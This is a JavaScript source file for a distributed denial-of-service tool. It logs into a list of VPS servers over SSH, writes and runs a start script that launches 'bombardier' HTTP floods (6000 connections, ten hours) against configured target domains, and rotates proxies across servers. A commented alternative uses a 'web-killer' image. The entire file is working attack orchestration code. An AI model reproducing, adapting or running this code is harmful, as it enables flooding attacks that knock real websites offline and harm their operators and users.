import fs from "fs";
import vps from "./config/vps.js";
import sitesData from "./config/sites.js";
import proxiesData from "./config/proxies.js";
import {createConnect} from "./core/connection.js";
let indexProxy = 0;
let countProxy = 1;
init()

async function init(){
    const sites = compareSites()

    countProxy = Math.floor(proxiesData.length / vps.length / sites.length)
    if(!countProxy) countProxy = 1;
    await fileHandler(sites);
    for (let i = 0; i < vps.length; i++) {
        try{
            let v = vps[i];
            let ssh = await createConnect(v);
            await putFile(ssh);
            await execFile(ssh);
        }catch (e){
            console.log(e.toString());
        }
    }



    // init();
}
/**
 * Копирование файла.
 *
 * @param ssh
 */
async function putFile(ssh){
    await ssh.putFile('/Users/qa/projects/war/bash/start.sh', '/home/start.sh');
    await ssh.putFile('/Users/qa/projects/war/bash/stop.sh', '/home/stop.sh');
    console.log("start.sh copy")
}

/**
 * Копирование файла.
 *
 * @param ssh
 */
async function putProxyFile(ssh){
    await ssh.putFile('/Users/qa/projects/war/bash/proxy.sh', '/home/proxy.sh');
    console.log("proxy.sh copy")
}


/**
 * Генерация команд под сервер
 */
async function fileHandler(sites){

    let command = ' #!/bin/bash\n';

    sites.map((site, index) => {
        let proxy = JSON.stringify(proxiesData.splice(0, countProxy));
        command = command + 'screen -dm -S "gatila_' + index + '" docker run -ti --rm alpine/bombardier -c 6000 -d 36000s -l ' + site + '\n';
        // command = command + `screen -dm -S "gatila_${index}" docker run -e url=${site.domain} -e proxies='${proxy}' -ti --rm developerdeveloper/web-killer\n`;
    })
    fs.writeFileSync('./bash/start.sh', command);
    console.log('start.sh create');
}

/**
 * Генерация команд под сервер
 */
async function fileProxyHandler(proxy){

    let $proxy = `${proxy.login}:${proxy.pass}@${proxy.host}:${proxy.port}`;

    let command = ' #!/bin/bash\n' +
        'unset http_proxy\n' +
        'unset https_proxy\n' +
        'unset no_proxy\n' +
        'unset HTTP_PROXY\n' +
        'unset HTTPS_PROXY\n' +
        'unset NO_PROXY\n' +
        '\n' +
        `export http_proxy="http://${$proxy}/"\n` +
        `export https_proxy="https://${$proxy}/"\n` +
        'export no_proxy="127.0.0.1,localhost"\n' +
        '\n' +
        `export HTTP_PROXY="http://${$proxy}/"\n` +
        `export HTTPS_PROXY="https://${$proxy}/"\n` +
        'export NO_PROXY="127.0.0.1,localhost"\n' +
        `wget -O - -q icanhazip.com`;


        fs.writeFileSync('./bash/proxy.sh', command);
    console.log('proxy.sh create');
}

/**
 * Старт процесса
 */
async function execFile(ssh) {
    await ssh.exec('docker pull developerdeveloper/web-killer', []).catch(e => {console.log(e)})

    await ssh.exec('chmod +x /home/stop.sh', [])
    await ssh.exec('/home/stop.sh', []).catch(() => {})
    await ssh.exec('rm /home/stop.sh', []).catch(e => {console.log(e)})

    await ssh.exec('chmod +x /home/start.sh', [])
    await ssh.exec('/home/start.sh', []).catch(e => {console.log(e)})
    // await ssh.exec('rm /home/start.sh', []).catch(e => {console.log(e)})

    console.log("start.sh start")
}

/**
 * Установить proxy
 */
async function execProxyFile(ssh) {
    await ssh.exec('chmod +x /home/proxy.sh', [])
    await ssh.exec('/home/proxy.sh', []).catch(() => {})
    await ssh.exec('rm /home/proxy.sh', []).catch(e => {console.log(e)})

    console.log("proxy.sh start")
}

function compareSites(){
    let sites = []
    sitesData.map(site => {
        for(let i = 0; i < site.count; i++){
            sites.push(site.domain)
        }
    })

    return sites;
}

async function changeProxies(){
    for (let i = 0; i < vps.length; i++) {
        changeIndexProxy();
        let ssh = await createConnect(vps[i]);
        await fileProxyHandler(proxiesData[indexProxy]);
        await putProxyFile(ssh);
        await execProxyFile(ssh);
    }

    changeProxies();
}

function changeIndexProxy() {
    indexProxy++;

    if(indexProxy >= proxiesData.length){
        indexProxy = 0;
    }
}